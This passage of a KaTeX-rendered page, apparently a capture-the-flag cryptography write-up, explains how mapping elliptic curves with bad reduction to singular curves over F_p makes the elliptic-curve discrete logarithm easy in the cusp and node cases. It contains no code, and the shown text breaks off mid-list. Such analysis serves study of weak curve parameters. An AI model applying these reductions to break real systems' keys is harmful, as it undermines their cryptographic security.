style="top:-2.55em;margin-left:-0.0637em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mopen >(</span><span class="mord mathnormal">a</span><span class=mclose >)</span></span></span><span style="top:-0.91em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >≥</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0637em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mopen >(</span><span class="mord mathnormal">b</span><span class=mclose >)</span><span class=mord >.</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:2.75em;"><span></span></span></span></span></span></span></span></span></span></span></span></div> <p>Then multiplying both sides of <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">y^2 = x^3 + ax + b</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0085em;vertical-align:-0.1944em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.8974em;vertical-align:-0.0833em;"></span><span class=mord ><span class="mord mathnormal">x</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> by <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mi>B</mi></msup></mrow><annotation encoding="application/x-tex">p^B</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0358em;vertical-align:-0.1944em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span></span></span></span></span></span></span>, we have</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mrow><msup><mi>p</mi><mi>B</mi></msup><mo stretchy=false >(</mo><msup><mi>y</mi><mn>2</mn></msup><mo stretchy=false >)</mo><mo>=</mo><msup><mi>p</mi><mi>B</mi></msup><mo stretchy=false >(</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy=false >)</mo></mrow><annotation encoding="application/x-tex"> p^B(y^2) = p^B(x^3 + ax + b) </annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.1413em;vertical-align:-0.25em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span></span></span></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class=mclose >)</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:1.1413em;vertical-align:-0.25em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span></span></span></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">x</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class=mclose >)</span></span></span></span></span></div> <p>or equivalently</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mrow><mo stretchy=false >(</mo><msup><mi>p</mi><mi>Y</mi></msup><mi>y</mi><msup><mo stretchy=false >)</mo><mn>2</mn></msup><mo>=</mo><mo stretchy=false >(</mo><msup><mi>p</mi><mi>X</mi></msup><mi>x</mi><msup><mo stretchy=false >)</mo><mn>3</mn></msup><mo>+</mo><msup><mi>p</mi><mrow><mi>A</mi><mo>+</mo><mi>X</mi></mrow></msup><mi>a</mi><mi>x</mi><mo>+</mo><msup><mi>p</mi><mi>B</mi></msup><mi>b</mi><mo separator=true >,</mo></mrow><annotation encoding="application/x-tex"> (p^Yy)^2 = (p^Xx)^3 + p^{A+X}ax + p^Bb, </annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.1413em;vertical-align:-0.25em;"></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class=mclose ><span class=mclose >)</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:1.1413em;vertical-align:-0.25em;"></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class=mclose ><span class=mclose >)</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:1.0858em;vertical-align:-0.1944em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:1.0858em;vertical-align:-0.1944em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class=mpunct >,</span></span></span></span></span></div> <p>and so the map</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mtable rowspacing=0.25em  columnalign="right left" columnspacing=0em ><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mi>E</mi><mrow><mo fence=true >(</mo><msub><mi mathvariant=double-struck >Q</mi><mi>p</mi></msub><mo separator=true >,</mo><mi>a</mi><mo separator=true >,</mo><mi>b</mi><mo fence=true >)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>⟶</mo><mi>E</mi><mrow><mo fence=true >(</mo><msub><mi mathvariant=double-struck >Z</mi><mi>p</mi></msub><mo separator=true >,</mo><msup><mi>p</mi><mi>A</mi></msup><mi>a</mi><mo separator=true >,</mo><msup><mi>p</mi><mi>B</mi></msup><mi>b</mi><mo fence=true >)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mo stretchy=false >(</mo><mi>x</mi><mo separator=true >,</mo><mi>y</mi><mo stretchy=false >)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>⟼</mo><mo stretchy=false >(</mo><msup><mi>p</mi><mi>X</mi></msup><mi>x</mi><mo separator=true >,</mo><msup><mi>p</mi><mi>Y</mi></msup><mi>y</mi><mo stretchy=false >)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} E\left(\mathbb{Q}_p, a, b\right) &amp;\longrightarrow E\left(\mathbb{Z}_p, p^Aa, p^Bb\right)\\ (x, y) &amp;\longmapsto (p^Xx, p^Yy) \end{aligned}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:3.1027em;vertical-align:-1.3013em;"></span><span class=mord ><span class=mtable ><span class=col-align-r ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:1.8013em;"><span style="top:-3.91em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=minner ><span class="mopen delimcenter" style="top:0em;">(</span><span class=mord ><span class="mord mathbb">Q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.3587em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mopen >(</span><span class="mord mathnormal">x</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class=mclose >)</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:1.3013em;"><span></span></span></span></span></span><span class=col-align-l ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:1.8013em;"><span style="top:-3.91em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >⟶</span><span class=mspace  style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=minner ><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class=mord ><span class="mord mathbb">Z</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span><span style="top:-2.3587em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >⟼</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class=mclose >)</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:1.3013em;"><span></span></span></span></span></span></span></span></span></span></span></span></div> <p>is a homomorphism and respects the group operation.</p> <p>From there, we can compose with the natural reduction</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mtable rowspacing=0.25em  columnalign="right left" columnspacing=0em ><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><msub><mi mathvariant=double-struck >Z</mi><mi>p</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>⟶</mo><msub><mi mathvariant=double-struck >F</mi><mi>p</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant=normal >∞</mi></munderover><msub><mi>c</mi><mi>k</mi></msub><msup><mi>p</mi><mi>k</mi></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>⟼</mo><msub><mi>c</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} \mathbb{Z}_p &amp;\longrightarrow \mathbb{F}_p\\ \sum_{k=0}^\infty c_kp^k &amp;\longmapsto c_0 \end{aligned}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:4.7535em;vertical-align:-2.1268em;"></span><span class=mord ><span class=mtable ><span class=col-align-r ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:2.6268em;"><span style="top:-5.4382em;"><span class=pstrut  style="height:3.6514em;"></span><span class=mord ><span class=mord ><span class="mord mathbb">Z</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.1268em;"><span class=pstrut  style="height:3.6514em;"></span><span class=mord ><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:1.6514em;"><span style="top:-1.8479em;margin-left:0em;"><span class=pstrut  style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.05em;"><span class=pstrut  style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class=pstrut  style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">∞</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:1.3021em;"><span></span></span></span></span></span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal">c</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.15em;"><span></span></span></span></span></span></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:2.1268em;"><span></span></span></span></span></span><span class=col-align-l ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:2.6268em;"><span style="top:-5.4382em;"><span class=pstrut  style="height:3.6514em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >⟶</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.1268em;"><span class=pstrut  style="height:3.6514em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >⟼</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mord ><span class="mord mathnormal">c</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:2.1268em;"><span></span></span></span></span></span></span></span></span></span></span></span></div> <p>to get an ECDLP instance over <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant=double-struck >F</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">\mathbb{F}_p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.975em;vertical-align:-0.2861em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>, which we are more familiar with. </p> <p>Since the server chooses the elliptic curves to have a bad reduction, the resulting curves will be singular when passed through this transformation. Depending on our luck, there are three possible cases here:</p> <ol> <li><p>The singular curve has a cusp, in which case solving ECDLP over it is equivalent to solving DLP in the group <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant=double-struck >F</mi><mi>p</mi><mo lspace=0em  rspace=0em >+</mo></msubsup></mrow><annotation encoding="application/x-tex">\mathbb{F}_p^{+}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.1544em;vertical-align:-0.3831em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.7713em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span>, which is easy.</p> <li><p>The singular curve has a node, and the gradients of the tangent to the curve at the singularity lie in <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant=double-struck >F</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">\mathbb{F}_p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.975em;vertical-align:-0.2861em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>, in which case solving ECDLP is equivalent to solving DLP in <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant=double-struck >F</mi><mi>p</mi><mo lspace=0em  rspace=0em >×</mo></msubsup></mrow><annotation encoding="application/x-tex">\mathbb{F}_p^{\times}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.1544em;vertical-align:-0.3831em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.7713em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">×</span></span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span>, which is easy provided we choose <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> such that <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >−</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6444em;"></span><span class=mord >1</span></span></span></span> is smooth.</p> <li><p>The singular curve has a node, but the gradients of the tangent to the curve at the singularity lie in <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant=double-struck >F</mi><msup><mi>p</mi><mn>2</mn></msup></msub></mrow><annotation encoding="application/x-tex">\mathbb{F}_{p^2}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0026em;vertical-align:-0.3137em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.3448em;"><span style="top:-2.5224em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class=pstrut  style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.3137em;"><span></span></span></span></span></span></span></span></span></span> and not <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant=double-struck >F</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">\mathbb{F}_p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true 